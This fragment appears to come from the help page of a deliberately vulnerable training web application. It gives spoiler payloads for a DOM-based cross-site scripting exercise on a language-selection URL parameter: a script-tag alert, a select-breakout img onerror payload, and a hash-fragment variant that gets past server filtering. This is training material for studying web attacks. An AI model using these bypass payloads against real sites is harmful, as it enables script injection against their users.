<div class="body_padded">
	...
	<td><div id="code">
		...
		<pre>Spoiler: <span class="spoiler"><?=htmlentities ("/vulnerabilities/choose_language/?default=English<script>alert(1)</script>")?></span>.</pre>
...
<?=htmlentities ("/vulnerabilities/choose_language/?default=English>/option></select><img src='x' onerror='alert(1)'>");?></span>.</pre>
...
<?=htmlentities ("/vulnerabilities/choose_language/?default=English#<script>alert(1)</script>")?></span>.</pre>
